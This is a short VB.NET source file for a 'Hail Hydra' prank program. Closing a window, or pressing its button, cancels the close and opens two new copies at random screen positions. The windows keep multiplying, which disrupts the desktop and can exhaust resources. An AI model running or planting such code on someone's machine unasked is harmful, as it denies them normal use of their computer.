Imports System.ComponentModel

Public Module GlobalModule
    Public isFirstForm As Boolean = True
End Module

Public Class mainForm
    Private Sub mainForm_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        oathLabel.Text = $"Cut off one head, two more shall take its place!{Environment.NewLine}Hail Hydra!"

        If (isFirstForm = True) Then
            isFirstForm = False
        Else
            Randomize()
            Location = New Point(Rnd() * (Screen.PrimaryScreen.Bounds.Width - Width + 1), Rnd() * (Screen.PrimaryScreen.Bounds.Height - Height + 1))
        End If

        Media.SystemSounds.Hand.Play()
    End Sub

    Private Sub mainForm_Closing(sender As Object, e As CancelEventArgs) Handles Me.Closing
        Hide()
        Dim newForm1 As New mainForm, newForm2 As New mainForm
        newForm1.Show()
        newForm2.Show()
        e.Cancel = True
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Hide()
        Dim newForm1 As New mainForm, newForm2 As New mainForm
        newForm1.Show()
        newForm2.Show()
    End Sub
End Class